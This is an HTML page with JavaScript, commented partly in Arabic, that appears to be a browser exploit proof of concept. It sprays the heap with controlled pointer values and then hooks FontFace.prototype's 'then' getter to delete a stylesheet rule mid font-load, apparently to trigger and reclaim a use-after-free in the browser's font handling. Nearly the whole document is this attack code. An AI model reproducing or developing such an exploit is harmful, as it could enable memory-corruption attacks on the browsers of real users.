<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 15px; }
        #console { width: 100%; height: 90vh; overflow-y: scroll; border: 1px solid #333; padding: 10px; }
    </style>
</head>
<body>
    <div id="console"></div>

    <style id="s">@font-face { font-family: 'x'; src: local('Arial'); }</style>

    <script>
        const logBox = document.getElementById('console');
        function debug(msg) {
            logBox.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        // --- مكان وضع الكود الجديد للرش (Heap Spraying) ---
        function sprayHeap() {
            debug("Spraying heap with controlled pointers (0x41414141)...");
            let spray = [];
            for (let i = 0; i < 500; i++) {
                let arr = new Uint32Array(0x400);
                // هذا هو النمط الذي سيعوض الكائن المحرر
                arr[0] = 0x41414141; // العنوان الأول
                arr[1] = 0x42424242; // العنوان الثاني
                spray.push(arr);
            }
            return spray;
        }
        // --------------------------------------------------

        window.onload = async () => {
            debug("System Initialized.");
            
            // استدعاء دالة الرش قبل الثغرة
            let memoryBuffers = sprayHeap(); 

            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);

            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    debug("!!! TRAP HIT !!!");
                    document.getElementById('s').sheet.deleteRule(0);
                    document.body.offsetTop;
                    return undefined;
                }
            });

            debug("Attempting load...");
            try {
                await document.fonts.load('1em x', 'AB');
                debug("Load returned.");
            } catch (e) {
                debug("Analysis: " + e.message);
            }
        };
    </script>
</body>
</html>
